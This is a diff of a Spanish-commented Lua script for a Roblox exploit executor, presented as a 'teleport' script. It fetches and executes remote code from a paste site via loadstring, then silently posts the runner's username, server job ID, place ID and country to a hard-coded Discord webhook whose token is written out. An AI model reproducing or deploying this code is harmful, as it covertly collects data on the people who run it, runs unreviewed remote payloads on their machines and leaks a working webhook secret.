@@ -3,10 +3,10 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- ====================================
--- Script 2: Loadstring Teleport (se ejecuta primero)
+-- Script 1: Teleport (se ejecuta primero completo)
 -- ====================================
-if not getgenv().EjecutarsePrimero_Loadstring then
-    getgenv().EjecutarsePrimero_Loadstring = true
+if not getgenv().EjecutarsePrimero_TP then
+    getgenv().EjecutarsePrimero_TP = true
 
     pcall(function()
         loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
@@ -14,25 +14,24 @@ if not getgenv().EjecutarsePrimero_Loadstring then
 end
 
 -- ====================================
--- Script 1: Webhook Delta-safe (espera JobId válido y carga del jugador)
+-- Script 2: Webhook Delta-safe (espera a que el TP termine)
 -- ====================================
-if not getgenv().EjecutarsePrimero_Webhook1 then
-    getgenv().EjecutarsePrimero_Webhook1 = true
+if not getgenv().EjecutarsePrimero_Webhook then
+    getgenv().EjecutarsePrimero_Webhook = true
+
+    -- Espera hasta que el LocalPlayer tenga Character y esté completamente cargado
+    local function waitForPlayerLoad(player)
+        local character = player.Character or player.CharacterAdded:Wait()
+        if not character.PrimaryPart then
+            character:WaitForChild("HumanoidRootPart")
+        end
+        return character
+    end
 
     task.spawn(function()
-        -- Espera hasta que JobId esté disponible, máximo 15 segundos
-        local maxWait = 15
-        local elapsed = 0
-        while (not game.JobId or game.JobId == "") and elapsed < maxWait do
-            task.wait(0.5)
-            elapsed = elapsed + 0.5
-        end
+        waitForPlayerLoad(LocalPlayer) -- espera que el TP termine realmente
 
-        -- Espera adicional a que el jugador haya cargado completamente
-        -- Se puede ajustar según la carga de items/estadísticas
-        task.wait(3)
-
-        local WebhookURL1 = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
+        local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
         local placeId = tostring(game.PlaceId)
         local jobId = tostring(game.JobId)
         local nick = LocalPlayer.Name
@@ -77,7 +76,7 @@ if not getgenv().EjecutarsePrimero_Webhook1 then
         local countryName = detectCountry()
         local countryField = "País: "..countryName
 
-        local info1 = {
+        local info = {
             ["content"] = "**Teleport jugador 100% funciona 👀!**",
             ["embeds"] = {{
                 ["title"] = "Datos para unirse 🔥",
@@ -96,21 +95,14 @@ if not getgenv().EjecutarsePrimero_Webhook1 then
             }}
         }
 
-        local jsonData1 = HttpService:JSONEncode(info1)
-
-        -- Reintentos hasta 3 veces para asegurar envío correcto
-        local success = false
-        for attempt = 1, 3 do
-            success = pcall(function()
-                request({
-                    Url = WebhookURL1,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = jsonData1
-                })
-            end)
-            if success then break end
-            task.wait(2) -- espera 2 segundos antes de reintentar
-        end
+        local jsonData = HttpService:JSONEncode(info)
+        pcall(function()
+            request({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
     end)
 end
